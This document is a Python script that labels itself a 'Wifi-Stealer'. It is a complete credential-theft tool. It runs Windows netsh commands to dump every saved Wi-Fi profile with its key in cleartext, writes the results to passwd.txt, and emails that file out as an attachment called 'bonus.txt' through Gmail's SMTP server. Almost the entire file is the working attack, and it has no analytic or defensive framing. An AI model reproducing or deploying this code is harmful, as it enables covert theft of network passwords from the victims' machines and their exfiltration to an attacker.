import os
import socket
import smtplib


from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart



def getSSID():
    file = open('random.txt','r')
    linhas = file.readlines()
    file.close()
    ssid = []
    for linha in linhas:
        linha = linha.strip()
        if linha.find(': ') != -1:
            SSID = (linha.strip('All Users Profiles:'))
            ssid.append(SSID)
            pass
        pass
    return ssid
    pass

def mkText():

    file = 'random.txt'
    os.system('netsh wlan show profiles > random.txt')

    pass

def execute():
    a = mkText()
    string = getSSID()
    for x in range(0, string.__len__()):
        os.system('netsh wlan show profiles "{}" key=clear >> passwd.txt'.format(string[x]))
        pass
    return a
    pass

def check_host():

   confiaveis = ['www.google.com', 'www.yahoo.com', 'www.bb.com.br']
   for host in confiaveis:
     a=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     a.settimeout(.5)
     try:
       b=a.connect_ex((host, 80))
       if b==0: #ok, conectado
         return True
     except:
       pass
     a.close()
   return False

def emailSend(email, passwd):



    fromaddr = email
    toaddr = email

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Senhas ... "

    body = "Wifi-Stealer  -  m4sk0fm3"

    msg.attach(MIMEText(body, 'plain'))

    filename = "bonus.txt"
    attachment = open("passwd.txt", "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, passwd)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()



    pass





if __name__ == '__main__':

    a = execute()
    email = ''
    passwd = ''
    emailSend(email, passwd)



